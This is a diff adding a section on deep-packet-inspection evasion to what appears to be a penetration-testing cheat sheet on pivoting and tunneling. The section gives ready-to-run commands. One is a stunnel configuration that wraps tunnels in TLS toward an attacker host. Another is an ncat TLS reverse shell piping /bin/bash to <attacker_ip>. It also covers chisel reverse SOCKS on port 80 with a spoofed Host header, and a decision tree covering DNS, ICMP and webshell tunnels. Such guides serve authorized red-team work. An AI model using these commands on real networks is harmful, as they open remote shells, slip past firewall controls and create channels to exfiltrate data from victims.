@@ -256,11 +256,82 @@ Same framing as DNS tunneling — last resort, slow, use for a shell/exfil chann
 
 ---
 
+## DPI Evasion — When Standard Tunnels Are Blocked
+
+When a DPI appliance inspects traffic beyond port/protocol and kills non-HTTP tunnels even on allowed ports (443/80), standard chisel/ligolo-ng/SSH tunnels fail on the first packets despite connecting. **Symptom:** tunnel on an internal segment works fine but drops immediately when crossing a firewall boundary, while `curl http://your-server/test` succeeds — that's DPI filtering non-HTTP traffic.
+
+### stunnel — TLS-wrap any TCP tunnel
+
+Wraps arbitrary TCP in TLS so DPI sees only a TLS handshake + encrypted data, indistinguishable from HTTPS.
+
+```bash
+# === Attacker side ===
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 30 -nodes -subj "/CN=webserver"
+
+cat > /etc/stunnel/stunnel.conf << 'EOF'
+[tunnel]
+accept = 443
+connect = 127.0.0.1:8080
+cert = /path/to/cert.pem
+key = /path/to/key.pem
+EOF
+stunnel /etc/stunnel/stunnel.conf
+# Start your actual listener/tunnel server on 8080
+
+# === Target side ===
+cat > /tmp/stunnel-client.conf << 'EOF'
+[tunnel]
+client = yes
+accept = 127.0.0.1:9999
+connect = <attacker_ip>:443
+verify = 0
+EOF
+stunnel /tmp/stunnel-client.conf
+
+# Now connect your tool to localhost:9999 — it exits the target as TLS on 443
+chisel client 127.0.0.1:9999 R:socks
+```
+
+### ncat --ssl — quick TLS tunnel (no stunnel setup)
+
+```bash
+# Attacker — TLS listener
+ncat --ssl -nlvp 443
+
+# Target — TLS-encrypted reverse shell
+ncat --ssl <attacker_ip> 443 -e /bin/bash
+```
+
+### Chisel on port 80 (HTTP/WebSocket blending)
+
+Chisel already uses HTTP/WebSocket as its transport — it performs a real HTTP upgrade, so most DPI passes it. Run the server on port 80 to blend with HTTP traffic: `chisel server --reverse --port 80`. If WebSocket is also blocked, try `--header "Host: allowed-domain.com"` to set an SNI/Host header matching a whitelisted domain.
+
+### Protocol selection decision tree
+
+```
+Can you reach your attacker on ANY TCP port?
+├── YES → Can raw TCP connections survive (no DPI)?
+│   ├── YES → Use standard tunnel: chisel, ligolo-ng, SSH
+│   └── NO (DPI kills non-HTTP/TLS) →
+│       ├── Port 443 open? → stunnel + your tunnel, or chisel (already HTTP-based)
+│       ├── Port 80 open?  → chisel on port 80 (HTTP/WebSocket transport)
+│       └── Other port?    → stunnel on that port wrapping your tunnel in TLS
+│
+└── NO TCP outbound →
+    ├── DNS (UDP 53) allowed? → dnscat2 or iodine
+    ├── ICMP allowed?         → icmpsh (very slow, last resort)
+    └── Nothing allowed       → look for an egress path via a different host,
+                                 or pivot through a web application (Neo-reGeorg webshell tunnel)
+```
+
+---
+
 ## Tools Reference
 
 | Name | URL |
 |---|---|
 | ligolo-ng | https://github.com/nicocha30/ligolo-ng |
+| stunnel | https://www.stunnel.org |
 | chisel | https://github.com/jpillora/chisel |
 | sshuttle | https://github.com/sshuttle/sshuttle |
 | socat | http://www.dest-unreach.org/socat/ |
